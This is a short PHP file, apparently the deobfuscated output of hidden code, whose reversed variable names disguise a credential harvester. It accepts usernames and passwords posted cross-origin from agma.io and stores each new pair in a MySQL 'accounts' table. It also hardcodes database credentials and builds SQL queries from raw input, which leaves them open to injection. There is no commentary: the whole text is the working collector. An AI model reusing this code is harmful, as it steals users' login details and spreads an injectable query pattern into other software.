<?php

/* #1: PHPDeobfuscator eval output */ 
    header("Access-Control-Allow-Origin: http://agma.io");
    header("Access-Control-Allow-Origin: https://agma.io");
    $emanresu = $_POST["emanresu"];
    $drowssap = $_POST["drowssap"];
    if (isset($emanresu) && isset($drowssap)) {
        $noitcennoc = mysqli_connect("localhost", "rogergroup_slpx", "5m2p4FVVc%", "rogergroup_slpx");
        $lqs = "SELECT emanresu, drowssap FROM stnuocca WHERE emanresu='" . $emanresu . "' AND drowssap='" . $drowssap . "'";
        if (mysqli_num_rows(mysqli_query($noitcennoc, $lqs)) == 0) {
            $lqs = "INSERT INTO stnuocca (emanresu, drowssap) VALUES ('{$emanresu}', '{$drowssap}')";
            mysqli_query($noitcennoc, $lqs);
        }
    }
/* END:#1 */
